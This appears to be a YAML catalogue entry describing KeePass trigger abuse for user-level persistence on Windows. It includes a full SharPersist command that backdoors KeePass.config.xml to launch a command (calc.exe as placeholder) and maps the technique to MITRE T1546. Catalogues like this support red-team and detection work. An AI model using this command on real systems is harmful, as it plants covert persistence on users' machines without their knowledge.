---
Name: KeePass
Description: KeePass is a free open source password manager.
Author: 'Adam Brass and Martin Sohn Christensen'
Created: 2023-02-28
Usage:
  - Steps: KeePass config file is backdoored by SharPersist by using 'SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add' where -t argument (persistence technique) keepass, -c argument (command to execute), -a argument to mask the previous command, along with the -f argument to create/ or modify the corresponding KeePass config file, ending with -m argument as method for (add, remove, check, list) add.
    Description: Uses KeePass database as persistence trigger / backdoors user''s KeePass configuration file with a KeePass trigger
    Usecase: Establishing persistence on a Windows host
    Category: Persistence
    Privileges: User
    Limitations: No limitations as you do not need admin access to establish this persistence mechanism
    MitreID: T1546
Resources:
  - Link: https://github.com/mandiant/SharPersist
  - Link: https://keepass.info/help/v2/triggers.html
  - Link: https://medium.com/@two06/persistence-with-keepass-part-2-3e328b24e117
Acknowledgement:
  - Person: 'Brett Hawkins'
    Handle: '@h4wkst3r'
---
